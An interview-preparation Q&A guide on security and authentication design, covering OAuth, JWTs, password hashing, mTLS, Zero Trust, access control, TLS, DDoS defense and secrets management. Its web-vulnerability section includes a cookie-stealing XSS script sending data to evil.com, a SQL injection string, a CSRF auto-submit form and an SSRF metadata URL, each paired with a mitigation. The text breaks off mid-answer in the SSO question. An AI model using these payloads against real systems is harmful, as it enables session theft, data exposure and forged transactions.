# Security and Authentication — HLD Interview Q&A

---

## Easy (Q1–Q7)

---

### Q1. What is the difference between authentication and authorization?

**Answer:**

These two terms are frequently confused but represent fundamentally different security concepts that together control access to systems.

**Authentication (AuthN) — "Who are you?"**
Verifying the identity of a user, service, or system. Establishes *who* is making a request.

```
User provides: username + password / biometric / hardware token
System verifies: "Yes, this person is Alice (user_id: 12345)"

Authentication factors:
  Something you KNOW:    Password, PIN, security question
  Something you HAVE:    OTP device, hardware key (YubiKey), phone (SMS OTP)
  Something you ARE:     Fingerprint, face recognition, iris scan
  
Multi-Factor Authentication (MFA): 2 or more factors required
  e.g., Password (know) + OTP code (have)
```

**Authorization (AuthZ) — "What are you allowed to do?"**
Determining what an authenticated identity is permitted to do. Establishes *what* they can access.

```
Alice (authenticated) tries to: GET /api/admin/users

Authorization check:
  "Alice has role CUSTOMER. Admin API requires role ADMIN."
  -> 403 Forbidden

Bob (authenticated, role ADMIN) tries to: GET /api/admin/users
  "Bob has role ADMIN. Admin API requires ADMIN."
  -> 200 OK
```

**Key differences:**

| Aspect | Authentication | Authorization |
|--------|---------------|---------------|
| Question | Who are you? | What can you do? |
| Happens | First (prerequisite) | After authentication |
| Failure response | 401 Unauthorized | 403 Forbidden |
| Mechanism | Passwords, tokens, certs | Roles, policies, ACLs |
| Examples | OAuth, SAML, mTLS | RBAC, ABAC, ACL |

**HTTP status codes:**
- **401 Unauthorized:** Authentication failed or missing (misleadingly named — actually means unauthenticated).
- **403 Forbidden:** Authenticated but not authorized for this resource.

**Example interaction:**
```
Request without token:
  HTTP 401 Unauthorized
  WWW-Authenticate: Bearer realm="api"

Request with valid token but wrong role:
  HTTP 403 Forbidden
  {"error": "Insufficient permissions", "required_role": "admin"}
```

A system can verify identity (authentication) independently of what that identity can do (authorization). SSO (Single Sign-On) handles authentication once; each application enforces its own authorization policies.

---

### Q2. How does the OAuth 2.0 authorization code flow with PKCE work?

**Answer:**

OAuth 2.0 is an authorization framework that allows third-party applications to access user resources without the user sharing their password. The **Authorization Code Flow with PKCE** (Proof Key for Code Exchange) is the most secure flow, recommended for all public clients (mobile apps, SPAs).

**Why PKCE?**
Without PKCE, the authorization code could be intercepted by a malicious app on mobile (via custom URL scheme hijacking). PKCE prevents this by proving the same party that requested the code is the one exchanging it.

**Flow:**
```
1. Client generates PKCE pair:
   code_verifier = random_string(43-128 chars)
   code_challenge = base64url(sha256(code_verifier))

2. Client -> Authorization Server (redirect):
   GET /authorize?
     response_type=code
     &client_id=my-app
     &redirect_uri=https://app.example.com/callback
     &scope=openid email
     &state=random_csrf_token
     &code_challenge=E9Melhoa2...
     &code_challenge_method=S256

3. User sees login/consent screen on Authorization Server.
   User authenticates and grants consent.

4. Authorization Server -> Client (redirect to redirect_uri):
   GET https://app.example.com/callback?
     code=SplxlOBeZQQYbYS6WxSbIA
     &state=random_csrf_token
   (Client verifies state to prevent CSRF)

5. Client -> Authorization Server (back-channel):
   POST /token
   {
     grant_type: authorization_code,
     code: SplxlOBeZQQYbYS6WxSbIA,
     redirect_uri: https://app.example.com/callback,
     client_id: my-app,
     code_verifier: random_string_from_step_1  <- proves identity
   }

6. Authorization Server:
   - Verifies code is valid and not expired
   - Verifies sha256(code_verifier) == code_challenge from step 2
   - Returns: {access_token, refresh_token, id_token, expires_in}

7. Client uses access_token to call APIs:
   GET /api/profile
   Authorization: Bearer <access_token>
```

**Key components:**
- **Authorization Server:** Identity provider (Auth0, Okta, AWS Cognito, Google).
- **Resource Server:** The API being protected.
- **Client:** The application requesting access.
- **Resource Owner:** The user.

**PKCE prevents interception attacks:** Even if the authorization code is intercepted (e.g., by another app with the same custom URL scheme), the attacker cannot exchange it for tokens because they don't know the `code_verifier`.

**Scopes define granular access:**
```
scope=openid email profile  -> ID token + email claim + profile claims
scope=read:files            -> Read access to files only
scope=write:files           -> Write access to files
```

---

### Q3. What is the structure of a JWT, and when should you use JWT vs session cookies?

**Answer:**

**JWT (JSON Web Token)** is a compact, URL-safe token format for representing claims between two parties. It is self-contained — the token carries all necessary information.

**Structure:**
```
JWT = base64url(Header) + "." + base64url(Payload) + "." + Signature

Example JWT:
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
  eyJzdWIiOiJ1c2VyLTEyMyIsImVtYWlsIjoiYWxpY2VAZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NDcyMjYwMDB9.
  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Header (decoded):
  {"alg": "RS256", "typ": "JWT"}

Payload (decoded):
  {
    "sub": "user-123",
    "email": "alice@example.com",
    "role": "admin",
    "iss": "https://auth.example.com",  <- issuer
    "aud": "https://api.example.com",   <- audience
    "iat": 1747222400,                  <- issued at
    "exp": 1747226000                   <- expiry (1 hour)
  }

Signature:
  HMAC_SHA256(base64url(header) + "." + base64url(payload), secret_key)
  or RSA/ECDSA for asymmetric (recommended for production)
```

**JWT is NOT encrypted by default** (that's JWE). The payload is base64-encoded, not encrypted — anyone can decode it. Don't put secrets in JWT payload.

**JWT vs Session Cookies:**

| Aspect | JWT (Stateless) | Session Cookie (Stateful) |
|--------|----------------|--------------------------|
| Server state | None (self-contained) | Session store (Redis/DB) |
| Scalability | Horizontal scale trivial | Session store needed |
| Revocation | Hard (can't invalidate issued token) | Instant (delete session) |
| Token size | Larger (~400-2000 bytes) | Small (session_id ~32 bytes) |
| CSRF risk | Lower (not auto-sent by browser if not in cookie) | Higher (cookies auto-sent) |
| XSS risk | Higher (if stored in localStorage) | Mitigated by HttpOnly cookie |
| Mobile-friendly | Yes (no cookie jar needed) | Harder |
| Logout | Requires blacklist or short TTL | Delete session immediately |

**Use JWT when:**
- Stateless microservices (each service validates token independently, no shared session store).
- Mobile apps / SPAs.
- API authentication for third-party clients.
- Short-lived tokens (< 15 min access token + refresh token pattern).

**Use session cookies when:**
- Traditional web applications with server-side rendering.
- Instant revocation is critical (banking, medical).
- You control all clients (all use a browser).

**Best practices:**
- Sign with RS256 (asymmetric) not HS256 (symmetric) — services can verify without knowing the signing key.
- Keep access tokens short-lived (15 min).
- Use refresh tokens for long sessions.
- Store JWTs in memory or HttpOnly cookies, never localStorage (XSS vulnerable).

---

### Q4. What is the difference between access tokens and refresh tokens?

**Answer:**

Access tokens and refresh tokens are complementary mechanisms that balance security with user experience. They implement the principle of short-lived credentials with longer-lived renewal capability.

**Access Token:**
- Short-lived credential (typically 15 minutes to 1 hour).
- Used to authenticate every API request.
- Bearer token — whoever has it can use it.
- Sent with every API call.
- Stateless (JWT) or stateful (opaque reference to session store).
- If compromised, damage is limited to the expiry window.

**Refresh Token:**
- Long-lived credential (hours, days, months, or permanent until revoked).
- Used ONLY to obtain new access tokens from the authorization server.
- Never sent to resource servers/APIs (only to auth server).
- Stored securely (HttpOnly cookie or secure native storage).
- Enables revocation: revoking a refresh token immediately invalidates all future access tokens.

**Flow:**
```
1. User logs in -> receives {access_token (15min), refresh_token (30 days)}

2. API calls for 15 minutes using access_token:
   GET /api/profile
   Authorization: Bearer <access_token>
   -> 200 OK

3. Access token expires after 15 min:
   GET /api/profile
   Authorization: Bearer <expired_access_token>
   -> 401 Unauthorized

4. Client silently refreshes (user doesn't see this):
   POST /token
   {grant_type: refresh_token, refresh_token: <refresh_token>}
   -> {new_access_token (15min), new_refresh_token (30 days)}
   
   Note: Refresh token rotation — old refresh token is invalidated when new one is issued.
   This detects refresh token theft (if old token is used again, suspicious activity).

5. User logs out:
   POST /revoke
   {token: <refresh_token>}
   -> Refresh token invalidated. User cannot get new access tokens.
   -> Access tokens already issued still work until they expire (15 min max).
```

**Refresh token rotation + reuse detection:**
```
Normal flow:
  RT1 issued -> used -> RT2 issued, RT1 invalidated
  RT2 used -> RT3 issued, RT2 invalidated

Theft detection:
  Attacker steals RT1 before it's used.
  Legitimate user uses RT1 -> RT2 issued, RT1 invalidated.
  Attacker tries RT1 -> Server: "RT1 was already used! Possible theft!"
  -> Invalidate entire token family (all refresh tokens for this user session)
  -> User must re-authenticate
```

**Storage recommendations:**

| Platform | Access Token | Refresh Token |
|----------|-------------|---------------|
| Web SPA | Memory (JS variable) | HttpOnly SameSite=Strict cookie |
| Mobile app | Secure storage (Keychain/KeyStore) | Secure storage |
| Server-to-server | Environment variable | Same |

---

### Q5. How should passwords be stored securely?

**Answer:**

Passwords must never be stored in plaintext or with reversible encryption. If your database is compromised, plaintext passwords immediately expose all users (and their reused passwords on other sites).

**What NOT to do:**

```python
# NEVER: Plaintext
store(password="mysecretpassword")

# NEVER: Reversible encryption (decryptable if key leaked)
store(password=AES_encrypt("mysecretpassword", key))

# NEVER: Fast hash (MD5, SHA-1, SHA-256)
store(password=md5("mysecretpassword"))
# md5 cracks in milliseconds with GPU (10 billion hashes/sec)

# NEVER: Hash without salt (rainbow table attacks)
store(password=sha256("mysecretpassword"))
# Pre-computed lookup tables crack any common password instantly
```

**What TO DO — slow, salted, key-derivation functions:**

**bcrypt:**
```python
import bcrypt

# Hashing (register):
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# rounds=12 -> 2^12 = 4096 iterations. ~100ms per hash.
# Salt is embedded in the hash output automatically.

# Verification (login):
valid = bcrypt.checkpw(password.encode(), stored_hash)
```
- Deliberately slow (cost factor configurable).
- Built-in salt (128 bits, random).
- Max password length: 72 bytes (use pre-hashing for longer passwords).
- Suitable for most applications.

**Argon2 (recommended as of 2023+):**
```python
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,      # iterations
    memory_cost=65536, # 64MB memory required
    parallelism=2,     # number of threads
)

# Hash:
hash = ph.hash("mysecretpassword")

# Verify:
ph.verify(hash, "mysecretpassword")  # returns True or raises VerificationError
```

Argon2 won the Password Hashing Competition (2015). Three variants:
- **Argon2id** (recommended): Combines Argon2i (side-channel resistant) and Argon2d (GPU resistant).
- Memory-hard: even with massive GPU parallelism, each hash requires 64MB+ RAM, defeating GPU farms.

**scrypt:**
```python
import hashlib
import os

salt = os.urandom(16)
dk = hashlib.scrypt(password.encode(), salt=salt, n=16384, r=8, p=1, dklen=64)
# n=16384 (CPU/memory cost), r=8 (block size), p=1 (parallelization)
```
Memory-hard like Argon2. Used in Ethereum, Litecoin.

**Comparison:**

| Algorithm | Speed | Memory-hard | GPU resistant | Recommended? |
|-----------|-------|-------------|---------------|-------------|
| MD5 | Instant | No | No | Never |
| SHA-256 | Very fast | No | No | Never |
| bcrypt | Slow | No | Partial | Yes (legacy systems) |
| scrypt | Slow | Yes | Yes | Yes |
| Argon2id | Slow | Yes | Yes | Best choice |

**Additional best practices:**
- Enforce minimum password length (12+ characters).
- Don't truncate passwords.
- Allow all Unicode characters.
- Check against haveibeenpwned.com list of breached passwords.
- Pepper: a server-side secret added before hashing (if DB is compromised but app server isn't, hashes can't be cracked without the pepper).

---

### Q6. What are common web security vulnerabilities, and how do you mitigate them?

**Answer:**

**1. SQL Injection**
Attacker injects malicious SQL into user input.
```sql
-- Vulnerable:
query = "SELECT * FROM users WHERE email = '" + user_input + "'";
-- Input: ' OR '1'='1 -> dumps all users

-- Fixed: Parameterized queries (prepared statements)
cursor.execute("SELECT * FROM users WHERE email = ?", (user_email,))
```
Mitigation: Parameterized queries, ORM (always), input validation, least-privilege DB user (no DROP/CREATE rights).

**2. Cross-Site Scripting (XSS)**
Attacker injects malicious JavaScript that executes in victims' browsers.
```html
<!-- Stored XSS (comment stored in DB, rendered to all visitors): -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

<!-- Mitigation: HTML-encode all user output -->
&lt;script&gt;...&lt;/script&gt;  <!-- rendered as text, not executed -->
```
Mitigation: Escape all user-supplied content in HTML output, Content Security Policy (CSP) headers, HttpOnly cookies (JS can't read them), sanitization libraries.

**3. CSRF (Cross-Site Request Forgery)**
Attacker tricks authenticated user's browser into making unintended state-changing requests.
```html
<!-- Malicious page (attacker's site): -->
<form action="https://bank.com/transfer" method="POST">
  <input name="amount" value="1000">
  <input name="to_account" value="attacker_account">
</form>
<script>document.forms[0].submit();</script>
<!-- Browser auto-sends bank.com cookies with this request! -->
```
Mitigation:
- CSRF tokens (unique per-session, per-form token, verified server-side).
- `SameSite=Strict/Lax` cookie attribute (browser won't send cookie on cross-site requests).
- Check `Origin` and `Referer` headers.

**4. SSRF (Server-Side Request Forgery)**
Attacker tricks the server into making requests to internal resources.
```
Vulnerable endpoint: GET /fetch?url=<user_provided_url>
Attacker input: url=http://169.254.169.254/latest/meta-data/
                    (AWS instance metadata service -> IAM credentials leaked!)
```
Mitigation: Allowlist permitted domains/IPs, block private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x), use a dedicated egress proxy, validate and parse URLs before requesting.

**5. IDOR (Insecure Direct Object Reference)**
User accesses another user's resource by changing an identifier.
```
GET /api/invoices/1234   <- User's own invoice
GET /api/invoices/1235   <- Another user's invoice! Server doesn't check ownership.
```
Mitigation: Always verify resource ownership: `SELECT * FROM invoices WHERE id=? AND user_id=current_user_id`. Use random UUIDs instead of sequential IDs (UUIDs don't enumerate, but still verify ownership).

**Summary table:**

| Vulnerability | Root Cause | Primary Mitigation |
|---------------|-----------|-------------------|
| SQL Injection | Unsanitized SQL | Parameterized queries |
| XSS | Unescaped HTML output | Escape output, CSP |
| CSRF | Missing origin validation | CSRF tokens, SameSite cookies |
| SSRF | Unrestricted outbound requests | URL allowlisting, block internal IPs |
| IDOR | Missing authorization check | Verify ownership on every request |

---

### Q7. What is the principle of least privilege, and how do you apply it in system design?

**Answer:**

The **Principle of Least Privilege (PoLP)** states that every user, process, or system should have only the minimum access rights necessary to perform its legitimate functions, and nothing more.

**Core idea:** Reducing access scope limits the blast radius of any security breach. A compromised low-privilege component can't escalate to take down the entire system.

**Applied to different layers:**

**Database access:**
```sql
-- Bad: Application uses root/DBA account
GRANT ALL PRIVILEGES ON *.* TO 'app_user'@'%';

-- Good: Application uses read-only account for reads, separate account for writes
CREATE USER 'app_read'@'%' IDENTIFIED BY '...';
GRANT SELECT ON orders_db.* TO 'app_read'@'%';

CREATE USER 'app_write'@'%' IDENTIFIED BY '...';
GRANT SELECT, INSERT, UPDATE ON orders_db.orders TO 'app_write'@'%';
-- app_write cannot DROP tables or access other DBs
```

**Cloud IAM (AWS):**
```json
// Bad: Admin access for an application
{ "Effect": "Allow", "Action": "*", "Resource": "*" }

// Good: S3 read-only to specific bucket + prefix
{
  "Effect": "Allow",
  "Action": ["s3:GetObject"],
  "Resource": "arn:aws:s3:::my-bucket/app/data/*"
}
```

**Service-to-service authorization (microservices):**
```
Payment Service identity -> ALLOWED: Write to payments table
                         -> DENIED: Read from users table (no business need)
                         
User Service identity    -> ALLOWED: Read/write to users table
                         -> DENIED: Access payments table
```

**Kubernetes RBAC:**
```yaml
# Limit a service account to only read its own namespace's pods
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
  # NOT: "delete", "create", or access to secrets/configmaps
```

**Secret access:**
```
Application needs: DB_PASSWORD, STRIPE_API_KEY
Vault policy: app-service -> can read: secret/app/db-password, secret/app/stripe-key
              app-service -> CANNOT read: secret/admin/*, secret/other-service/*
```

**Temporal least privilege:** Grant access only for the duration it's needed.
```python
# Short-lived database credentials (Vault dynamic secrets):
# Credentials expire after 1 hour, auto-renewed by app
# If app is compromised, credentials expire and attacker loses access
```

**Zero-standing privileges:** Don't give humans standing admin access. Use Just-In-Time (JIT) access: request elevated access for 1 hour, log the reason, auto-revoke.

---

## Medium (Q8–Q15)

---

### Q8. How does mTLS work for service-to-service authentication?

**Answer:**

**mTLS (Mutual TLS)** extends standard TLS to require both the client and server to authenticate with certificates, enabling bidirectional identity verification.

**Standard TLS (one-way):**
```
Client connects to Bank.com:
  1. Server presents certificate: "I am bank.com, signed by DigiCert CA"
  2. Client verifies: checks DigiCert's signature, checks bank.com matches hostname
  3. Client trusts server; encrypted channel established
  4. Server doesn't know who the client is (anonymous connection)
```

**mTLS (two-way / mutual):**
```
Service A connects to Service B:
  1. Service B presents certificate: "I am payment-service, signed by Internal CA"
  2. Service A verifies B's certificate against Internal CA
  3. Service A presents its certificate: "I am order-service, signed by Internal CA"
  4. Service B verifies A's certificate against Internal CA
  5. Both parties authenticated; encrypted channel established
  6. Service B authorizes: "order-service is allowed to call /payments endpoint"
```

**Certificate structure for services:**
```
Internal CA (self-signed, rotated annually)
  |
  +--> order-service certificate
  |      Subject: CN=order-service, O=acme-corp
  |      SAN: order-service.orders.svc.cluster.local
  |      Validity: 24 hours (short-lived, rotated by cert manager)
  |
  +--> payment-service certificate
         Subject: CN=payment-service, O=acme-corp
         SAN: payment-service.payments.svc.cluster.local
         Validity: 24 hours
```

**Implementation approaches:**

**1. Application-level mTLS:**
```python
import ssl

# Service B (server):
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain('payment-service.crt', 'payment-service.key')
context.load_verify_locations('internal-ca.crt')
context.verify_mode = ssl.CERT_REQUIRED  # require client certificate

# Service A (client):
client_context = ssl.create_default_context()
client_context.load_cert_chain('order-service.crt', 'order-service.key')
client_context.load_verify_locations('internal-ca.crt')
```

**2. Service Mesh (Istio) — zero-code mTLS:**
```yaml
# Enable strict mTLS for all services in namespace
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
spec:
  mtls:
    mode: STRICT  # reject non-mTLS connections

# Istio Citadel issues certs to each pod automatically
# Envoy sidecar handles mTLS transparently
# App code speaks plain HTTP internally
```

**3. Authorization policy based on certificate identity:**
```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payment-service-policy
spec:
  selector:
    matchLabels:
      app: payment-service
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/orders/sa/order-service"]
        # Only order-service service account can call payment-service
```

**Certificate rotation:**
Short-lived certificates (24 hours) reduce the window of exposure if a certificate is compromised. cert-manager (Kubernetes) automates issuance and rotation from Vault or Let's Encrypt.

---

### Q9. What is Zero Trust Architecture, and how does it differ from perimeter security?

**Answer:**

**Perimeter Security (Castle-and-Moat model):**
Trust everyone inside the network; block outsiders with a firewall.
```
[Internet] ---[Firewall]--- [Trusted Internal Network]
                              All internal services trust each other
                              No authentication between internal services
                              
Problem: Attacker breaches one internal service -> lateral movement to all others
         VPN compromise -> attacker is "inside the castle", full internal access
         Insider threat -> trusted by default
```

**Zero Trust Architecture:**
"Never trust, always verify." No implicit trust based on network location. Every access is verified regardless of whether it comes from inside or outside the network perimeter.

**Zero Trust principles (NIST SP 800-207):**

1. **All resources are not trusted by default**, regardless of network location.
2. **All communication is secured** (mTLS, encryption in transit).
3. **Access is granted per-session**, not per-network.
4. **Access is determined dynamically** based on identity, device health, context.
5. **Least-privilege access** is enforced everywhere.
6. **Assume breach** — design for when an attacker is already inside.

**Zero Trust implementation layers:**

```
Identity verification:
  -> Every request carries a verifiable identity token (JWT, mTLS cert)
  -> Service accounts, not just users

Device posture:
  -> Is the device managed? Is it patched? Is EDR running?
  -> Only healthy, managed devices can access sensitive resources

Network microsegmentation:
  -> Services can only communicate with explicitly allowed peers
  -> Default deny all network traffic
  -> Kubernetes NetworkPolicy or service mesh AuthorizationPolicy

Application-level authorization:
  -> Even if network allows it, application verifies authorization at every call
  -> No "trusted internal caller" exceptions

Continuous verification:
  -> Short-lived tokens (15 min access tokens, 24h certificates)
  -> Re-verify on sensitive operations (step-up auth)
  
Logging and monitoring:
  -> All access logged with full identity context
  -> Behavioral analytics to detect anomalies
```

**Practical Zero Trust components:**

| Component | Technology |
|-----------|-----------|
| Identity Provider | Okta, Azure AD, Google Workspace |
| Device trust | MDM (Intune, Jamf), EDR compliance check |
| Network access | BeyondCorp, Cloudflare Access, Zscaler |
| Service identity | mTLS with SPIFFE/SPIRE |
| Policy engine | OPA (Open Policy Agent), Casbin |
| Secrets | Vault, AWS Secrets Manager |

---

### Q10. What is RBAC vs ABAC, and when do you use each?

**Answer:**

**RBAC (Role-Based Access Control):**
Permissions assigned to roles; users assigned to roles. Simple and widely adopted.

```
Roles:    ADMIN    MANAGER    EMPLOYEE    GUEST
            |          |          |          |
Users:   Alice       Bob       Charlie     Dave
            |          |          |
Actions: ALL        Read+Write   Read Only

Policy evaluation:
  "Can Alice delete user?" -> Alice has ADMIN -> ADMIN can delete -> YES
  "Can Bob delete user?"   -> Bob has MANAGER -> MANAGER cannot delete -> NO
```

**Implementation:**
```python
# Role-permission mapping
PERMISSIONS = {
    "admin":    {"create", "read", "update", "delete"},
    "manager":  {"create", "read", "update"},
    "employee": {"read"},
    "guest":    set()
}

def can(user, action, resource=None):
    return action in PERMISSIONS.get(user.role, set())
```

Pros: Simple, easy to understand, easy to audit.
Cons: Role explosion (hundreds of roles), no fine-grained context-aware decisions.

**ABAC (Attribute-Based Access Control):**
Access granted based on attributes of the subject (user), resource, action, and environment. Policy-driven.

```
Attributes:
  User: {role: "doctor", department: "cardiology", clearance: "high"}
  Resource: {type: "patient_record", department: "cardiology", sensitivity: "high"}
  Action: "read"
  Environment: {time: "09:00", location: "hospital_network"}

Policy:
  "Allow read on patient_record IF
    user.role = doctor AND
    user.department = resource.department AND
    environment.location = hospital_network"

Result: Yes (same department, in hospital, doctor, business hours)
```

**ABAC example with OPA (Open Policy Agent):**
```rego
package authz

allow {
    input.action == "read"
    input.resource.type == "patient_record"
    input.user.role == "doctor"
    input.user.department == input.resource.department
    input.environment.location == "hospital_network"
}
```

**Comparison:**

| Aspect | RBAC | ABAC |
|--------|------|------|
| Complexity | Low | High |
| Flexibility | Low | High |
| Performance | Fast (role lookup) | Slower (policy eval) |
| Auditability | Easy | Complex |
| Fine-grained control | Limited | Full |
| Use case | Apps with clear roles | Healthcare, finance, government |
| Examples | AWS IAM roles, GitHub teams | OPA, AWS IAM policies, Azure ABAC |

**Hybrid approach (RBAC + ABAC):**
Use RBAC for coarse-grained access (only doctors can see patient records), then ABAC for fine-grained decisions (doctors can only see records in their department, during business hours, from within the hospital network).

---

### Q11. How does TLS work — certificate chains, CA validation, and the handshake?

**Answer:**

**TLS (Transport Layer Security)** provides encryption, authentication, and integrity for network communication. TLS 1.3 is current; TLS 1.2 still common.

**Certificate chain:**
```
Root CA (DigiCert)          <- Self-signed, baked into OS/browser trust store
    |
Intermediate CA             <- Signed by Root CA
    |
End-entity cert             <- Your server's certificate
  Subject: *.example.com
  Signed by: Intermediate CA
  Public key: [RSA/ECDSA public key]
  Validity: Not Before: 2025-01-01, Not After: 2025-12-31
  SAN: example.com, www.example.com
```

**Why intermediate CAs?**
Root CA private key is kept offline (air-gapped, physical security). If an intermediate CA is compromised, only certificates signed by that intermediate are affected — the Root CA can revoke the intermediate CA and issue a new one without affecting the entire trust hierarchy.

**TLS 1.3 Handshake:**
```
Client                                      Server

1. ClientHello:
   - TLS version: 1.3
   - Client random: [32 bytes]
   - Cipher suites: [TLS_AES_256_GCM_SHA384, ...]
   - Key share: client's ECDH public key
   
                     ------------------>

2. ServerHello:
   - Selected cipher: TLS_AES_256_GCM_SHA384
   - Server random: [32 bytes]
   - Key share: server's ECDH public key
   
   EncryptedExtensions (now encrypted):
   Certificate: [server cert + chain]
   CertificateVerify: signature over handshake using server private key
   Finished: HMAC of entire handshake
   
                     <------------------

3. Client:
   - Verifies certificate chain up to trusted Root CA
   - Verifies signature in CertificateVerify
   - Checks CN/SAN matches hostname
   - Checks validity dates
   - Checks CRL/OCSP (certificate not revoked)
   - Derives session keys from ECDH key exchange
   
   Finished: HMAC of entire handshake
   
                     ------------------>

4. Application data (encrypted with negotiated session keys)
```

**Key exchange (ECDH — Elliptic Curve Diffie-Hellman):**
```
Client private key: a (secret)
Server private key: b (secret)
Shared generator point G (public)

Client public key: A = a*G
Server public key: B = b*G

Shared secret: a*B = b*A = a*b*G
-> Both derive the same shared secret without transmitting it!
-> Session keys derived from shared secret + handshake data
-> Perfect Forward Secrecy: even if server's long-term key is later compromised,
   past sessions cannot be decrypted (session key was ephemeral)
```

**Certificate revocation:**
- **CRL (Certificate Revocation List):** Periodic download of revoked cert serial numbers. Slow (updated infrequently).
- **OCSP (Online Certificate Status Protocol):** Real-time query to CA's OCSP server.
- **OCSP Stapling:** Server fetches OCSP response and attaches it to TLS handshake (client doesn't need to query OCSP separately).

---

### Q12. What is DDoS protection, and how do rate limiting, WAF, and BGP blackholing work together?

**Answer:**

**DDoS (Distributed Denial of Service)** attacks attempt to overwhelm a service with traffic, causing legitimate users to be unable to access it. Defense is layered.

**Attack types and defenses:**

**Layer 7 DDoS (Application layer — HTTP floods):**
Millions of HTTP requests that look legitimate but exhaust server resources.

```
Attacker (botnet of 100K IPs):
  100K bots each send 1,000 req/sec = 100M req/sec to your API

Defense Layer 1: Rate Limiting
  Per-IP: allow 100 req/sec, then 429 Too Many Requests
  Per-user: allow 1000 req/min
  Per-endpoint: /login allows 10 req/min (brute force protection)
  
  Algorithm: Token bucket or sliding window
  Token bucket:
    Each IP has a bucket of N tokens
    Each request consumes 1 token
    Tokens refill at rate R per second
    Empty bucket = rate limited
```

**Defense Layer 2: WAF (Web Application Firewall)**
```
WAF inspects HTTP traffic and blocks based on rules:
  - IP reputation lists (known malicious IPs, Tor exit nodes, datacenter IPs)
  - Request patterns (SQL injection signatures, XSS patterns)
  - Behavioral analysis (bot fingerprinting, challenge pages)
  - Geographic blocking (block countries you don't serve)
  - Request rate anomalies (same IP, different user agents = bot)

AWS WAF rules example:
  - AWSManagedRulesCommonRuleSet (OWASP Top 10)
  - AWSManagedRulesKnownBadInputsRuleSet
  - Custom rule: block IPs with >1000 req/min
```

**Layer 3/4 DDoS (Network/Transport layer — volumetric):**
Floods network with UDP/TCP traffic at massive scale (100Gbps+).

```
Defense Layer 3: BGP Blackholing (RTBH — Remotely Triggered Black Hole)
  
When attack detected (100Gbps of UDP flood to 1.2.3.4):
  1. NOC triggers RTBH via BGP announcement
  2. ISP routers learn: "discard all traffic to 1.2.3.4"
  3. Traffic dropped at ISP level, never reaches your datacenter
  4. Side effect: legitimate traffic to 1.2.3.4 also dropped
  5. Use only when alternative (anycast) isn't available
  
Better: Traffic scrubbing centers (Cloudflare, Akamai, AWS Shield)
  All traffic routes to scrubbing center first
  Scrubber absorbs attack traffic (Tbps capacity)
  Legitimate traffic forwarded to origin
  Origin only sees cleaned traffic
```

**Layered DDoS protection architecture:**
```
[Attack Traffic]
       |
    [BGP Anycast] <- Traffic routed to nearest Cloudflare/Akamai PoP
       |
    [Scrubbing / L3/L4 DDoS mitigation] <- Absorbs volumetric attacks
       |
    [CDN Edge] <- Serves cached content, isolates origin
       |
    [WAF] <- Inspects L7, blocks OWASP patterns, bot traffic
       |
    [API Gateway / Rate Limiter] <- Per-IP, per-user limits
       |
    [Your Origin Servers]
```

**AWS Shield Standard vs Advanced:**
- Standard: Always-on L3/L4 DDoS protection (free with AWS).
- Advanced: L7 protection, AWS WAF included, DDoS cost protection, 24/7 DRT (DDoS Response Team), $3000/month.

---

### Q13. How do you manage secrets in production — Vault, AWS Secrets Manager, and rotation?

**Answer:**

Hardcoded secrets in code or environment variables are a major security risk. Secret management systems provide centralized, audited, access-controlled secret storage with rotation capabilities.

**The problem:**
```
# This is catastrophically wrong:
DB_PASSWORD=mysupersecretpassword  # in .env file committed to git
# GitHub searches find these constantly (GitHub Dorking)
```

**HashiCorp Vault:**
```
Vault capabilities:
  1. Static secrets: store KV secrets with access control
     vault kv put secret/myapp db_password=... api_key=...
     
  2. Dynamic secrets: generate temporary credentials on demand
     vault read database/creds/my-role
     -> {username: "v-role-abc123", password: "A1b2c3...", lease_duration: "1h"}
     -> Credentials expire and are auto-revoked after 1 hour
     -> DB grants/revokes user automatically
     
  3. PKI: issue short-lived TLS certificates
     vault write pki/issue/my-role common_name="order-service.example.com"
     -> {certificate: "---BEGIN CERT---...", private_key: "---BEGIN RSA---..."}
     -> Valid for 24 hours, auto-rotated

  4. Audit log: every secret access logged
     Who accessed what, when, from which IP/service identity
     
Authentication to Vault:
  Kubernetes: vault auth enable kubernetes
    -> Pod presents Kubernetes service account JWT
    -> Vault validates with Kubernetes API
    -> Returns Vault token with assigned policies
```

**AWS Secrets Manager:**
```python
import boto3

client = boto3.client('secretsmanager', region_name='us-east-1')

# Retrieve secret:
response = client.get_secret_value(SecretId='prod/myapp/db')
secret = json.loads(response['SecretString'])
db_password = secret['password']

# Automatic rotation:
# Configure rotation Lambda function
# Secrets Manager calls Lambda on schedule (e.g., every 30 days)
# Lambda: generate new password, update DB, update secret in Secrets Manager
# App: next call to get_secret_value returns new password
```

**Secret rotation best practices:**

```
Rotation strategy:
  1. Generate new secret
  2. Update downstream system (DB user password)
  3. Update secret store
  4. Verify new secret works
  5. Revoke old secret

Zero-downtime rotation:
  1. New password created alongside old
  2. Both passwords valid in DB for overlap period (30 min)
  3. Applications gradually pick up new password as they refresh
  4. After overlap period, old password revoked
```

**Kubernetes secret management (external-secrets-operator):**
```yaml
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: db-secret
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: vault-backend
    kind: SecretStore
  target:
    name: db-credentials  # creates Kubernetes Secret
  data:
  - secretKey: DB_PASSWORD
    remoteRef:
      key: secret/myapp/db
      property: password
```

**Audit and compliance:**
Vault's audit log captures every secret access. Enables compliance reporting: "Who accessed the production database credentials in the last 30 days?"

---

### Q14. How does Single Sign-On (SSO) work — SAML vs OIDC?

**Answer:**

**SSO** allows users to authenticate once and access multiple applications without re-entering credentials. Eliminates per-app password management.

**SAML 2.0 (Security Assertion Markup Language):**
XML-based standard, primarily used for enterprise SSO. Redirect-heavy browser flow.

```
Flow (SP-initiated SSO):

